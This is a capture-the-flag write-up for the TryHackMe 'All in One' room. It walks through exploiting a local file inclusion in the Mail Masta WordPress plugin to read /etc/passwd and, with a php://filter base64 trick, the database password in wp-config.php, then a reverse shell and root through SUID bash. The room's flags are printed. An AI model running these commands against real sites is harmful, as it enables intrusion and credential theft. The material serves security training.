---
title: TryHackMe - All in One
description: My writeup on All in One box.
categories:
 - tryhackme
tags: tryhackme wordpress wpscan lfi suid base64 bash
---

![](https://i.imgur.com/aGyzc6x.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **All in One**  |
| Difficulty :  | **Medium**             |
| Play :    | [All in One](https://tryhackme.com/room/allinonemj){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

This was a really cool box, It's about exploiting LFI on a vulnerable wordpress plugin this leads to reverse shell. Privesc to root is a simple SUID exploitation. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.148.28
$ nmap -sC -sV -oN nmap/allinone.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 17:23 EET
Nmap scan report for 10.10.148.28 (10.10.148.28)
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.234.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

FTP haven't any interesting file, so let's start enumerating the port 80. Once we visit the website we see the apache2 default page so let's fire up `gobuster`.

```
$ gobuster dir -q -u http://$ip/ -w $medium -x php,txt,html,js -o scans/gobuster.txt  
/index.html (Status: 200)
/wordpress (Status: 301)
```

`/wordpress` here we go. Without wasting time let's start a `wpscan` scan.

```
$ wpscan --no-banner --url http://$ip/wordpress -e ap,u -o scans/wpscan.txt

...data...

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.148.28/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.148.28/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.148.28/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.148.28/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2019-05-10T16:05:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.148.28/wordpress/wp-content/plugins/reflex-gallery/readme.txt


[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.148.28/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

We have a user `elyana` and 2 plugins. Let's search for possible exploits on `mail-masta` plugin.

```
$ searchsploit -w mail masta
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
 Exploit Title                                                                                                                      |  URL
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                              | https://www.exploit-db.com/exploits/40290
WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                     | https://www.exploit-db.com/exploits/41438
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
```

## Shell as www-data

Perfect, LFI one seems perfect. Let's test it out!

```
$ curl -s "http://$ip/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

Here we go, i tried to read the SSH private key for elyana and similar stuff but nothing worked. Then i had the idea to read the `wp-config.php` since it's running wordpress & it worked but we need a little trick. When we have LFI we can't read php files because they get executed by the webserver. So we will do a trick to bypass that using base64. I made a command that does the job:

```
$ curl -s "http://$ip/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d | grep "DB_PASSWORD"
define( 'DB_PASSWORD', 'H@ckme@123' );
```

Now we can login as `elyana:H@ckme@123` on wordpress at `/wp-admin`. We can spawn a reverse shell if you don't know how to spawn one follow my steps from this post [Vulnhub - ColddBox Easy ](https://0xatom.github.io/vulnhub/2020/10/25/colddbox-easy/){:target="_blank"}

```
$ nc -lvp 5555  
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as root

Privesc to root is easy, let's check for SUID files.

```
bash-4.4$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 43088 Sep 16 18:43 /bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root root 59608 Jan 18  2018 /bin/chmod
-rwsr-xr-x 1 root root 26696 Sep 16 18:43 /bin/umount
...data...
```

We can run `/bin/bash` as root, but it needs an argument `-p` to allow the shell to run with SUID privileges.

```
bash-4.4$ bash -p
bash-4.4# whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Let's read the flags. (You have to base64 decode them)

```
bash-4.4# find / \( -name "root.txt" -o -name "user.txt" \) -exec cat {} \; 2>/dev/null | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
